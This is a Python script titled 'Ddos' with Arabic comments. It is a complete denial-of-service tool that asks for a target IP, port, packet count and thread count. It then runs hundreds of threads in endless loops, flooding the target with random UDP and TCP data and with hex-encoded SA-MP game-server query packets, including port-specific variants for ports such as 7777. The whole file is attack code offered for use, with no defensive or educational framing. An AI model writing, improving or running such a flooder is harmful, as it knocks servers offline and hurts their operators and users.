# Ddos
import random
import threading
import codecs
import time
import socket
import os

# تنظيف الشاشة
os.system("cls" if os.name == "nt" else "clear")

# تدرج لوني
gradient_colors = [165, 135, 99, 63, 69, 75, 81, 87, 123, 159, 195]
ascii_art = [
    "  ___",
    "   /   |  ____  ____  ____  ____ ___  ______ ___  ____  __  _______",
    "  / /| | / __ \\/ __ \\/ __ \\/ __ `/ / / / __ `__ \\/ __ \\/ / / / ___/",
    " / ___ |/ / / / /_/ / / / / /_/ / /_/ / / / / / / /_/ / /_/ (__  )",
    "/_/  |_|/_/ /_/\\____/_/ /_/\\__,_/\\__, /_/ /_/ /_/\\____/\\__,_/____/",
    "                               /____/",
    "   _________",
    "  / ____/__ \\",
    " / /    __/ /",
    "/ /___ / __/",
    "\\____//____/"
]

def print_gradient_art(art_lines, colors):
    for i, line in enumerate(art_lines):
        color_code = colors[i % len(colors)]
        print(f"\033[38;5;{color_code}m{line}\033[0m")

print_gradient_art(ascii_art, gradient_colors)
print()

# إدخال البيانات
ip = str(input("Target Ip: "))
port = int(input("Target Port: "))
choice = str(input("Thb Tnik Serveur? (y/n): "))
times = int(input("Packet: "))
threads = int(input("Threads: "))

# باكيتات جاهزة
Pacotes = [
    codecs.decode("53414d5090d91d4d611e700a465b00", "hex_codec"),
    codecs.decode("53414d509538e1a9611e63", "hex_codec"),
    codecs.decode("53414d509538e1a9611e69", "hex_codec"),
    codecs.decode("53414d509538e1a9611e72", "hex_codec"),
    codecs.decode("081e62da", "hex_codec"),
    codecs.decode("081e77da", "hex_codec"),
    codecs.decode("081e4dda", "hex_codec"),
    codecs.decode("021efd40", "hex_codec"),
    codecs.decode("081e7eda", "hex_codec")
]

# دوال الهجوم
def run():
    data = random._urandom(1460)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (ip, port)
            for _ in range(times):
                s.sendto(data, addr)
            print("[UDP] Packets sent!")
        except Exception:
            print("[UDP] Error sending packets.")

def run2():
    data = random._urandom(1204)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            for _ in range(times):
                s.send(data)
            print("[TCP1] Packets sent!")
        except Exception:
            pass
        finally:
            s.close()

def run3():
    data = random._urandom(999)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            for _ in range(times):
                s.send(data)
            print("[TCP2] Packets sent!")
        except Exception:
            pass
        finally:
            s.close()

def run4():
    data = random._urandom(818)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            for _ in range(times):
                s.send(data)
            print("[TCP3] Packets sent!")
        except Exception:
            pass
        finally:
            s.close()

def run5():
    data = random._urandom(16)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            for _ in range(times):
                s.send(data)
            print("[TCP4] Packets sent!")
        except Exception:
            pass
        finally:
            s.close()

# كلاس خاص بالباكيتات
class MyThread(threading.Thread):
    def run(self):
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                msg = Pacotes[random.randrange(0, len(Pacotes))]
                sock.sendto(msg, (ip, port))

                # حالات خاصة للبورتات
                if port == 7777:
                    sock.sendto(Pacotes[5], (ip, port))
                elif port == 7796:
                    sock.sendto(Pacotes[4], (ip, port))
                elif port == 7771:
                    sock.sendto(Pacotes[6], (ip, port))
                elif port == 7784:
                    sock.sendto(Pacotes[7], (ip, port))
            except Exception:
                pass
            finally:
                sock.close()

# إطلاق الخيوط
if __name__ == '__main__':
    try:
        for _ in range(200):
            mythread = MyThread()
            mythread.start()
            time.sleep(0.1)
    except KeyboardInterrupt:
        os.system("cls" if os.name == "nt" else "clear")

    for _ in range(threads):
        if choice.lower() == 'y':
            threading.Thread(target=run).start()
            threading.Thread(target=run2).start()
            threading.Thread(target=run3).start()
            threading.Thread(target=run4).start()
        else:
            threading.Thread(target=run5).start()
